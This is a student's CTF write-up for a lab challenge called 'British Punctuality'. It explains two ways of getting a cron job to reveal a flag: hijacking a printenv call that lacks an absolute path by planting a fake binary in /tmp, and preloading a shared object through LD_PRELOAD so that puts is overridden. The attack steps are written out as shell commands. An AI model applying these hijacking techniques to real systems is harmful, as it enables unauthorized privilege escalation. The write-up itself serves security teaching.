# FSI-CTFS: British Punctuality
 
#### Exploits created by José Miguel Isidro aka [zmiguel2011](https://github.com/zmiguel2011)
## DISCAIMER:
> This exploit in British Punctuality's CTF in 22/23 due to an honest mistake by the teacher who created the CTF
> Although this wasn't the intended way to solve the CTF, this is how I managed to solve it. Nevertheless, the intended way to solving is also included in this repository and will explained [here](#intended-way-to-solve-the-ctf-exploitc)).

### Unintended Way to Solve the CTF (exploit.c)
> In [my_script.sh](../British%20Punctuality/my_script.sh) , printenv is vulnerable because of the missing absolute path. It should've been /bin/printenv. This enabled us to write arbitrary code in a 'fake' printenv program created by the user.

> You would have to compile this [program](../British%20Punctuality/exploit.c) with ggc and output the file to "printenv" in the /tmp folder.
```bash
cd /tmp
gcc -o printenv exploit.c
```

> Create a new /tmp/env file with:

```bash
PATH=/tmp
```

> Let the cronjob run and execute your printenv program and retrieve the flag from the last_log text file with:
```bash
cat /tmp/last_log
```


### Intended Way to Solve the CTF (exploit.c)

> Compile this [program](../British%20Punctuality/exploit2.c) with ggc and create shared object in the /tmp folder.
```bash
gcc -c -Wall -Werror -fpic exploit.c
gcc -shared -o myexploit.so exploit.o
```

> Create a new /tmp/env file with:

```bash
PATH=/tmp
LD_PRELOAD=/tmp/myexploit.so
```

> For reference, If you haven't heard about the [LD_PRELOAD](https://www.google.com/search?q=LD_PRELOAD+trick) environment variable, you should read about it for better understading of the step above.

> Let the cronjob run and execute the reader program which will then print the flag because the 'puts' function was overwritten. Retrieve the flag from the last_log text file with:
```bash
cat /tmp/last_log
```